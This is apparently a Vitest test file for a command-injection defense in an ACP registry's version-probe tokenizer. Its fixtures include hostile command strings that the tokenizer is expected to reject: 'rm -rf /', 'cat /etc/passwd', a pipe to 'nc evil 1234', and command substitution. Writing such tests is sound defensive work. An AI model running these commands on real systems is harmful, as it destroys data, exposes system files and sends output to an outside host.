import { describe, it, expect } from "vitest";
import { resolveVersionProbe, shouldUseShellForVersionProbe } from "../../src/lib/acp/registry.js";

// The tokenizer is security-critical: it must reject shell metacharacters so a
// malicious custom versionCommand cannot inject commands.
describe("ACP registry resolveVersionProbe (command-injection defense)", () => {
  it("tokenizes a plain version command", () => {
    expect(resolveVersionProbe("codex", "codex --version")).toEqual({ command: "codex", args: ["--version"] });
  });

  it("rejects shell metacharacters (; & | $ backtick)", () => {
    expect(resolveVersionProbe("x", "codex --version; rm -rf /")).toBe(null);
    expect(resolveVersionProbe("x", "x && cat /etc/passwd")).toBe(null);
    expect(resolveVersionProbe("x", "x | nc evil 1234")).toBe(null);
    expect(resolveVersionProbe("x", "x $(whoami)")).toBe(null);
    expect(resolveVersionProbe("x", "x `whoami`")).toBe(null);
  });

  it("rejects newlines", () => {
    expect(resolveVersionProbe("x", "x\nrm -rf /")).toBe(null);
  });

  it("handles quoted arguments", () => {
    expect(resolveVersionProbe("x", 'x --msg "hello world"')).toEqual({ command: "x", args: ["--msg", "hello world"] });
  });

  it("rejects unterminated quotes", () => {
    expect(resolveVersionProbe("x", 'x "unclosed')).toBe(null);
  });

  it("requireBinaryMatch enforces the command equals the configured binary", () => {
    expect(resolveVersionProbe("codex", "codex --version", true)).toEqual({ command: "codex", args: ["--version"] });
    expect(resolveVersionProbe("codex", "rm --version", true)).toBe(null);
  });

  it("returns null for empty command", () => {
    expect(resolveVersionProbe("x", "")).toBe(null);
    expect(resolveVersionProbe("x", "   ")).toBe(null);
  });
});

describe("shouldUseShellForVersionProbe", () => {
  it("is false on non-Windows regardless of command", () => {
    expect(shouldUseShellForVersionProbe("codex", "linux")).toBe(false);
    expect(shouldUseShellForVersionProbe("codex.cmd", "darwin")).toBe(false);
  });

  it("on Windows uses shell for .cmd/.bat/extensionless, not .exe", () => {
    expect(shouldUseShellForVersionProbe("codex.cmd", "win32")).toBe(true);
    expect(shouldUseShellForVersionProbe("codex.bat", "win32")).toBe(true);
    expect(shouldUseShellForVersionProbe("codex", "win32")).toBe(true);
    expect(shouldUseShellForVersionProbe("codex.exe", "win32")).toBe(false);
  });
});
